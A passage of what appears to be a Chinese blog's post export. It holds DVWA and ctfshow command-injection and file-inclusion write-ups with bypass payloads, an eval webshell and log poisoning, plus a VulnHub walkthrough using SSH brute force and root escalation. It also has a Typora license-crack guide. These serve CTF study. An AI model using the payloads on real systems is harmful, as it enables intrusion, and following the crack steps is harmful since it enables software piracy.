); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 函数解析： str_replace函数 替换字符串中的一些字符（区分大小写） 语法：str_replace(find,，replace，string，count) ​ find 必需。规定要查找的值 ​ replace 必需。规定替换find中的值的值 ​ string 必需。规定被搜索的字符串 ​ count 可选。一个变量，对替换数进行计数 array_keys函数 返回包含数组中所有键名的一个新数组 语法：array_keys(array，value，strict) ​ array 必需。规定数组 ​ value 可选。可以指定键值，然后只有该键值对应的键名会被返回 ​ strict 可选。与 value 参数一起使用 构建payload根据代码分析，我们发现代码中对“&amp;&amp;”和“;”符号进行了过滤，只要在攻击时不适用这两个符号就可以实现攻击 1234即： 127.0.0.1&amp;ipconfig 127.0.0.1|ipconfig 127.0.0.1||ipconfig High代码分析12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 函数分析High的代码和medium是差不多的，只是过滤的比较多 构建payload通过对代码的分析可以看到，这次的黑名单比medium多了很多，我们能用到的符号基本都是被过滤了的 仔细观察可以发现“|”的过滤中，是加了空格的，所以我们在攻击时可以使用“|”符号进行攻击，只要不加空格就可以 12即： 127.0.0.1|ipconfig impossible代码分析1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这关是不存在攻击可能性的安全关，直接分析源代码就可以 首先，这里防止命令注入的思路就是白名单，也就是说对输入进行过滤，只允许输入ip地址 具体来说就是，把输入的数据根据点分为4段，每一段都判断一下是不是数字，总共是不是四段，如果是的话，再用点把4段数字拼接起来。 函数解析 stripslashes函数 删除反斜杠 语法：stripslashes(string) ​ string 必需。规定要检查的字符串 explode函数 使用一个字符串分割另一个字符串，并返回由字符串组成的数组 语法：explode(separator，string，limit) ​ separator 必需。规定在哪里分隔字符串。 ​ string 必需。要分隔的字符串 ​ limit 可选。规定所返回的数组元素的数目。 is_numeric函数 用于检测变量是否为数字或数字字符串 语法：is_numeric ($var) 参数： $var 要检测的变量 ​","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"}]},{"title":"Typora1.7.6安装、激活","slug":"Typora1-7-6安装、激活","date":"2024-02-18T08:29:42.000Z","updated":"2024-02-23T06:51:57.233Z","comments":true,"path":"2024/02/18/Typora1-7-6安装、激活/","link":"","permalink":"http://example.com/2024/02/18/Typora1-7-6%E5%AE%89%E8%A3%85%E3%80%81%E6%BF%80%E6%B4%BB/","excerpt":"","text":"Typora1.7.6安装、激活一、安装Typora 双击“typora-setup-x64-1.7.6.exe”安装包 如果之前安装过先卸载，删除原文件夹 选择”Install for all users” ​ 图1-1 选择安装模式 选择安装目录，然后选择”Next” ​ 图1-2 选择安装目录 勾选“Create a desktop shortcut”，然后选择“Next” ​ 图1-3 选择额外任务 选择“Install”安装 ​ 图1-4 安装 完成安装，去掉“Launch Typora”勾选，然后选择“Finish” ​ 图1-5 完成安装 二、激活Typora 把“license-gen.exe”和“TyproaCrack.exe”放到安装Typora的目录下 ​ 图2-1 复制“license-gen.exe”和“TyproaCrack.exe”放到安装Typora的目录下 管理员模式运行“powershell”或”cmd”,我这使用的“powershell” ​ 图2-2 运行“posershell” 然后进入”CD “安装目录” “到安装Typora安装目录 输入”.\\license-gen.exe”，会自动生成一个序列号 ​ 图2-3 运行“license-gen.exe”生成序列号 在确保 typora 软件关闭的情况下，输入”.TyproaCrack.exe” ​ 图2-4 运行“.TyproaCrack.exe” 打开Typora，随便输入邮箱，然后把刚刚的序列号复制进去，最后点“激活” ​ 图2-5 激活页面 激活成功 ​ 图2-6 激活成功 ​","categories":[{"name":"软件安装","slug":"软件安装","permalink":"http://example.com/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"}],"tags":[{"name":"软件安装","slug":"软件安装","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"}]},{"title":"FPGA环境搭建","slug":"FPGA环境搭建","date":"2022-04-06T02:59:08.000Z","updated":"2024-02-23T06:42:16.880Z","comments":true,"path":"2022/04/06/FPGA环境搭建/","link":"","permalink":"http://example.com/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"FPGA环境搭建一、Quartus II 的下载百度网盘下载链接： 12https://pan.baidu.com/s/1a9d-bq9RZmWrRV542X4IEA 提取码：ifte 二、安装前的准备​ 1.在C盘意外的盘内新建一个文件夹，命名为 FPGA (我这里使用的虚拟机，所以就在C盘新建文件夹)，盘符的空间最好有20G以上 ​ 2.打开 FPGA 文件夹，在里面新建 Quartus II 和 modelSim 文件夹 三、Quartus II 的安装​ 1.解压压缩包 ​ 2.使用管理员运行可执行程序(运行前退出所有杀软，包括Windows Defender) ​ 3.进入安装向导 ​ 1.进入 welcom 界面，点击“Next” ​ 2.勾选“I accept the agreement”并点击“Next” ​ 3.选择安装路径，选择刚刚我们创建的“Quartus II”文件夹，然后点击“Next” ​ 4.这里就是安装一些器件库，全部勾选，然后点击“Next” ​ 5.这里表示要使用的空间，以及剩余磁盘空间大小，点击“Next” ​ 6.安装过程(等待时间可能会比较久)，等待完成后点击“Next” ​ 7.安装完成，这里直勾选“Create shortcuts on Desktop”点击“Finish”。至此，Quartus II就安装完成了 ​ 8.我们打开“Quartus II”软件，这里先选择试用30天，后续讲解破解过程 ​ 9.这里未提示需要安装器件库，所以可以直接使用 ​ a. 器件库的安装，首先需要下载对应的器件库 123下载地址：https://blog.csdn.net/z123459985/article/details/105349357说明： ​ b.将下载好的器件库，放到“Quartus II\\quartus\\bin”目录下 ​ c.打开“Quartus II”软件，在工具栏中选择“Tools”，然后选择“Install Devices” ​ d.点击“Next” ​ e.路径位置就选择“C:\\FPGA\\Quartus II\\quartus\\bin”(选择对应的Quartus文件夹即可)，点击“Next” ​ f.勾选新的器件库，然后点击“Next” ​ g.这里同样是说需要使用的空间，以及剩余磁盘空间，直接点击“Next” ​ h.等待进度条走完 ​ i.安装完成，点击“Finish” 四、ModelSim 的安装​ 1.解压压缩包 ​ 2.运行可执行程序 ​ 3.进入 welcom 界面，点击下一步 ​ 4.安装位置选择之前我们创建好的位置 “C:\\FPGA\\modelsim” ​ 5.许可协议界面，选择同意 ​ 6.安装界面 ​ 7.出现一个创建快捷方式的弹窗，选择是 ​ 8.又出现一个弹窗，直接选择是 ​ 9.第三个弹窗，同样选择是 ​ 1.接着出现一个是否重启电脑的选项，选择“否”.到此，FPGA的基本环境搭建也就结束了","categories":[{"name":"FPGA","slug":"FPGA","permalink":"http://example.com/categories/FPGA/"}],"tags":[{"name":"FPGA","slug":"FPGA","permalink":"http://example.com/tags/FPGA/"}]},{"title":"“FPGA”","slug":"“FPGA”","date":"2022-04-06T01:14:43.000Z","updated":"2024-02-18T07:42:17.850Z","comments":true,"path":"2022/04/06/“FPGA”/","link":"","permalink":"http://example.com/2022/04/06/%E2%80%9CFPGA%E2%80%9D/","excerpt":"","text":"FPGA环境搭建一、Quartus II 的下载百度网盘下载链接： 12https://pan.baidu.com/s/1a9d-bq9RZmWrRV542X4IEA 提取码：ifte 二、安装前的准备​ 1.在C盘意外的盘内新建一个文件夹，命名为 FPGA (我这里使用的虚拟机，所以就在C盘新建文件夹)，盘符的空间最好有20G以上 ​ 2.打开 FPGA 文件夹，在里面新建 Quartus II 和 modelSim 文件夹 三、Quartus II 的安装​ 1.解压压缩包 ​ 2.使用管理员运行可执行程序(运行前退出所有杀软，包括Windows Defender) ​ 3.进入安装向导 ​ 1.进入 welcom 界面，点击“Next” ​ 2.勾选“I accept the agreement”并点击“Next” ​ 3.选择安装路径，选择刚刚我们创建的“Quartus II”文件夹，然后点击“Next” ​ 4.这里就是安装一些器件库，全部勾选，然后点击“Next” ​ 5.这里表示要使用的空间，以及剩余磁盘空间大小，点击“Next” ​ 6.安装过程(等待时间可能会比较久)，等待完成后点击“Next” ​ 7.安装完成，这里直勾选“Create shortcuts on Desktop”点击“Finish”。至此，Quartus II就安装完成了 ​ 8.我们打开“Quartus II”软件，这里先选择试用30天，后续讲解破解过程 ​ 9.这里未提示需要安装器件库，所以可以直接使用 ​ a. 器件库的安装，首先需要下载对应的器件库 123下载地址：https://blog.csdn.net/z123459985/article/details/105349357说明： ​ b.将下载好的器件库，放到“Quartus II\\quartus\\bin”目录下 ​ c.打开“Quartus II”软件，在工具栏中选择“Tools”，然后选择“Install Devices” ​ d.点击“Next” ​ e.路径位置就选择“C:\\FPGA\\Quartus II\\quartus\\bin”(选择对应的Quartus文件夹即可)，点击“Next” ​ f.勾选新的器件库，然后点击“Next” ​ g.这里同样是说需要使用的空间，以及剩余磁盘空间，直接点击“Next” ​ h.等待进度条走完 ​ i.安装完成，点击“Finish” 四、ModelSim 的安装​ 1.解压压缩包 ​ 2.运行可执行程序 ​ 3.进入 welcom 界面，点击下一步 ​ 4.安装位置选择之前我们创建好的位置 “C:\\FPGA\\modelsim” ​ 5.许可协议界面，选择同意 ​ 6.安装界面 ​ 7.出现一个创建快捷方式的弹窗，选择是 ​ 8.又出现一个弹窗，直接选择是 ​ 9.第三个弹窗，同样选择是 ​ 1.接着出现一个是否重启电脑的选项，选择“否”.到此，FPGA的基本环境搭建也就结束了","categories":[{"name":"FPGA","slug":"FPGA","permalink":"http://example.com/categories/FPGA/"}],"tags":[{"name":"FPGA","slug":"FPGA","permalink":"http://example.com/tags/FPGA/"}]},{"title":"DeathNote靶机渗透过程","slug":"DeathNote靶机渗透过程","date":"2021-11-24T02:02:19.000Z","updated":"2021-11-24T09:01:37.254Z","comments":true,"path":"2021/11/24/DeathNote靶机渗透过程/","link":"","permalink":"http://example.com/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/","excerpt":"","text":"DeathNote靶机渗透过程准备环境攻击机：Kali-Linux-2021.3 目标靶机：Deathnote 平台：VMware Workstation Pro 15.6 难度：easy 均为 NAT 模式 一、信息搜集1.主机嗅探kali和DeathNote处于同一网段，查看kali当前IP` 1ifconfig 可知kali的IP地址为192.168.239.184/24，进行网段扫描 1netdiscover -r 192.168.239.0/24 扫描结果显示靶机的IP地址为192.168.239.186 注释：在同为NAT模式下，无法扫描出IP，不妨试试进入靶机的拯救模式 具体方法可以看：https://app.yinxiang.com/fx/d0e7d6f3-305d-457c-b10a-f3080d438617 2.端口扫描1nmap -sS 192.168.239.168 这里可以看到靶机开放了22和80端口 二、漏洞挖掘1.dirb扫描网站目录​ 1.首先使用dirb对网站的特殊文件进行扫描。 1dirb http://192.168.239.186 -X .txt,.html,.php,.bak,.bac,.sql,.php.bac,.jpg ​ 扫描到三个文件 ​ 2.我们使用dirb对网站目录进行扫描。 1dirb http://192.168.239.168 -r 2.访问其web页面信息1 访问网站80端口，192.168.239.186:80, ​ 之后跳转到 http://deathnote.vuln/wordpress/ 跳转到一个无法正常打开的页面，我们需要修改本机的hosts文件，手动将这个不存在的网页指向靶机 1vi /etc/hosts 注释：实际添加内同以实际情况为准，环境不同，IP不同 返回刷新浏览器 信息2 访问http://192.168.239.186/robots.txt。这里提示有一个**important.jpg**,还有用户**ryuk** 信息3 访问图片路径，试着打开图片，发现网页无法显示，所以把它下载下来 1wget http://192.168.239.186//important.jpg 打开图片，它显示一段文字，这里出现了名字有Soichiro Yagami，light，kira。并且提供了用户名：user.txt。并且提示密码在网站的提示页。 因此，我们点击网页上的HINT,点开后提示，咋回到server上的note.txt或者看L的留言。L的留言应该指的就是下面的“my fav line is iamjustic3” 3.WordPress后台登陆经过多次尝试，我使用用户名：kira，密码：iamjustic3成功登陆了wp后台 根据提示，我们现在需要找到note.txt 在 侧边栏—&gt;Media—&gt;Library，可看到notes.txt 下载下来 1wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt 查看notes.txt文件 1cat notes.txt 可以发现，notes.txt是个字典文件，可用于ssh登陆 三、漏洞利用1.SSH爆破启动msf6 1msfconsole 使用SSH_login模块、 1use auxiliary/scanner/ssh/ssh_login 查看当前选项列表 1show options 设置密码字典 1set pass_file ./notes.txt 设置目标主机 1set rhost 192.168.239.186 设置用户名，尝试用户名为l 1set username l 开始爆破 1run 爆破完成，用户名：l,密码death4me 2.SSH远程登陆使用刚刚爆破出的用户名和密码进行SSH连接 123ssh l@192.168.239.186yesdeath4me 3.提权检查当前用户 l 的权限 1sudo l 提示该用户不存在 sudoers列表中 查看当前家目录的文件列表 1ls -lha 存在user.txt文件，查看该文件，发现是BrainFuck编码 进行解码，在线工具：https://ctf.bugku.com/tool/brainfuck 查看 /home目录下有哪些用户 1ls /home -lha 进入kira的家目录，查看文件列表 1cd /home/kira &amp;&amp; ls -lha 发现存在 kira.txt文件，但是没有 l并没有权限查看 继续在靶机中寻找其他有价值的信息，发现在/opt下存在名为L的目录，查看L目录下的内容 1cd /opt/L &amp;&amp; ls -lha 进入到kira-case目录，发现有个名为case-file.txt文件，查看该文件内容 1cd ./kira-case &amp;&amp; cat case-file.txt 最后一句话，在提示 fake-notebook-rule目录下有我们想要得到的内容，切换至 fake-notebook-rule目录 1cd ../fake-notebook-rule &amp;&amp; ls -lha 里面存在两个文件，case.wav和 hine 查看case.wav内容 1cat case.wav 内容是一串16进制编码 查看hint内容 1cat hint 根据提示我们使用cyberchef进行编码 在左侧侧边栏拖拽From Hex(来自16进制)到Recipe模块，在Input模块中输入那串16进制编码，Output模块中就会输出结果，由输出结果可知结果又为一串Base64编码，再从侧边栏拖入From Base64模块到Recipe模块，Output模块中就会输出解码后的内容，内容为passwd : kiraisevil 尝试切换至用户kira 查看用户 kira的权限 1sudo -l 用户 kira可执行所有命令 查看kira家目录列表 1cd ~ &amp;&amp; ls -lha 查看 kira.txt 1cat kira.txt 发现又是一串 base64编码，进行解码查看内容 可得知还有一个目录/var里面有可用信息，切换到该目录 1cd /var &amp;&amp; cat misa 貌似没有什么有用的信息 刚才通过查看 kira的权限，得知用户kira能执行任何命令，可通过kira直接拿到 rootshell 1sudo su 已切换到 root用户，查看 /root目录下的内容 1cd /root &amp;&amp; cat root.txt 目标靶机渗透结束","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"文件包含","slug":"文件包含","date":"2021-11-21T02:48:22.000Z","updated":"2021-11-21T06:04:10.594Z","comments":true,"path":"2021/11/21/文件包含/","link":"","permalink":"http://example.com/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"web78源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 10:52:43# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 首先这是一个 file 关键字的get参数传递， php:// 是一种协议名称(命令执行web37中也有简单介绍)， php://filter/ 是一种访问本地文件的的协议， /read=convert.base64-encode/ 表示读取的方式是base64编码， resource=index.php 表示目标文件名为index.php。 ​ 通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include()函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。 ​ 而include的内容是由用户控制的，所以通过我们传递的 file 参数，是 include() 函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。 所以最终的payload如下： 1?file=php://filter/convert.base64-encode/resource=flag.php flag: web79源码： 123456789101112131415161718192021&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:10:14# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了 php ，所以可以使用 data:// 协议进行绕过： 123?c=file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;// 一下是 POST 数据1=system(&quot;tac falg.php&quot;); ​ 或者也可以使用下面的方法： 12/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;); flag: web80源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow命令执行笔记","slug":"命令执行","date":"2021-11-14T08:36:03.000Z","updated":"2021-11-18T11:21:47.456Z","comments":true,"path":"2021/11/14/命令执行/","link":"","permalink":"http://example.com/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"web29源码： 1234567891011121314151617181920212223&lt;php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析考点： 这题中看到两个函数 ​ eval() ​ preg_match 通过百度可知 ​ eval() 函数的功能是获取返回值 ​ preg_match 是执行正则表达式，在题中是起到一个过滤的作用。 解题： ​ 在代码中，我们可以看到过滤了 flag 而且不区分大小写 12345所需要使用的知识点 通配符 1. * 可以匹配0或多个字符 2. ? 可以匹配任意一个字符 3. [abcd] 匹配abcd中任何一个字符 4. [a-z] 匹配范围a到z，表示范围的意思 []匹配中括号中的任意一个字符 ​ 所以在这 flag 可以用 f* 或 f??? 代替 ​ 所以这个题的payload 123?c=system(&quot;cat f*.php&quot;);?c=system(&quot;cat f*&quot;);?c=system(&quot;cat f???.php&quot;); ​ 也可以使用 cp 命令 12?c=system(&quot;cp fla?.php 1.txt&quot;); //意思就是复制flag.php文件 明名为 1.txturl/1.txt //然后查看1.txt ​ 再补充一个，绕过可以用引号，反斜杠 1flag=fl\\ag=fl&#x27;&#x27;ag flag: web30源码： 1234567891011121314151617181920&lt;php/*# -*- coding: utf-8 -*-# @Author: hlxa# @Date: 2020-09-04 00:12:34# @Last: Modified by: hlxa# @Last: Modified time: 2020-09-04 00:42:36# @email: hlxa@ctfer.com# @link: http://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125;&#125; 分析： ​ 过滤了 flag,system,php关键字 1所需知识点反引号执行命令 ​ 因为过滤掉了 system，我们就得选择其他的命令执行函数 ​ 最常用的无需 echo 121. system();2. passthru(); ​ 需用 echo 函数 1231. 反引号 — `` 有 system() 的作用2. exec();3. shell_exec(); 实验： ​ 较上题比较，这题过滤多了 system 和 php ​ 所以 flag.php 中php可以使用 p?p 或 p* 代替 payload: 1234?c=passthru(&quot;cat fl&#x27;&#x27;ag.p?p&quot;);?c=echo (`cat fl&#x27;&#x27;ag.p?p`);?c=exec(`cp fl* 1.txt`); //然后接着访问 url/1.txt?c=shell_exec(&quot;cp f* 2.txt&quot;); //然后让问 url/2.txt flag: web31源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这道题比之前的题多过滤了 cat,sort,shell,反斜杠(\\),空格,点(.) 1cat 过滤时，可以代替绕过的姿势 tac: 从最后一行开始显示，是 cat 的反向显示 more: 一页一页的显示档案内容 less: 与 more 类似 head: 查看文档的前几行 tail: 查看文档的后几行 nl: 显示的时候，顺便输入行号 od: 以二进制的方式读取文档内容 vi: 一种编辑器 uniq: 查看 vim: 一种编译器 1空格过滤时，可以代替绕过的姿势 ${IFS} $IFS$1 ${IFS %20 &lt; 和 &lt;&gt; 重定向符 %09 实验： ​ 这道题过滤把主要的空格给过滤了，所以需要添加一个空格过滤符号。 ​ 这题的payload: 1234?c=echo(`more%09f*`); //more也可以写成less,nl,uniq,tac?c=passthru(&quot;tac%09f*&quot;); //tac也可以写成less,nl,uniq,more?c=echo`strings%09f*`;?c=&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;nl%09fl*&quot;); //等价于system。这个学到了! nl同样可以替换为more,less,uniq,tac,strings flag web32源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 又过滤了 shell,单引号(‘),反引号(`),echo,分号(;),括号(()) ​ 分号可以使用 ?&gt; 代替，括号可以使用 “” 绕过，所以使用文件包含的方式 实验： ​ 所以 payload 为： 1?c=include&quot;$_GET[1]&quot;?&gt;&amp;=php://filter/read=convert.base64-encode/resource=falg.php ​ 这题还可以使用伪协议 12?c=include&quot;$_POST[1]&quot;?&gt;1=php://filter/read=convert.base64-encode/resource=flag.php flag: 再使用 base64 工具转换就可以得到 flag 值 web33源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 02:22:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*///error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题过滤多了双引号，所以在上一题 payload 的基础上，去掉双引号即可 实验： payload1 1?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php payload2 12?c=include$_POST[1]?&gt;1=php://filter/read=convert.base64-encode/resource=flag.php flag: web34多过滤了 : payload同web33 web35多过滤了 = 和 &lt; payload同web33 web36过滤掉了数字，把1换成字母就可 web37— 日志shell源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题考的是一个协议问题，所以介绍一下各个协议的用法 12345678910111213file://协议用于访问本地文件，在CTF中通常用来读取本地文件示例： http://127.0.0.1/include.php?file://读取的路径php://协议php://访问各个输入/输出流，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码示例1： php://filter/read=convert.base64-encode/resource=[文件名]示例2： http://127.0.0.1/include.php?file=php://input [POST DATA部分] &lt;?php phpinfo(); ?&gt; //现在不太能理解，先放着后面学习。data://协议通常可以用来执行PHP代码示例1： http://127.0.0.1/include.php?file=data://text/plain,命令&lt;?php%20phpinfo();?&gt;示例2： http://127.0.0.1/include.php?file=data://text/plain;base64,base64编码搬运的：https://www.cnblogs.com/z1ten9/p/14360476.html 实验： payload1： 12?c=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;&lt;?php system(&quot;ls&quot;);?&gt; base64形式为 PD9waHAgc3lzdGVtKCdscycpOz8+ 因为题目中过滤了 flag,所以使用 base64 编码可以实现绕过 1?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg== payload2 利用日志： 1. 首先在 url 中添加一句话木马，让其记录到服务器中的日志文件中，此次题目的环境日志路径为：/var/log/nginx/access.log 1?c=&lt;?php @eval($_POST[1]);?&gt; ​ 2.访问日志文件，查看是否多了一句话木马： 蚁剑 or 中国菜刀 类似工具连接：但是失败了 flag: web38—日志shell源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 比较上题过滤多了 php,file ​ 所以 &lt;?php 写为 &lt;?= 实验： payload1: 1?c=data://text/plain,&lt;?=system(&quot;ls&quot;);?&gt; 1?c=data://text/plain;base64,PD89IHN5c3RlbSgidGFjIGYqIik7Pz4= web39源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:13:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; 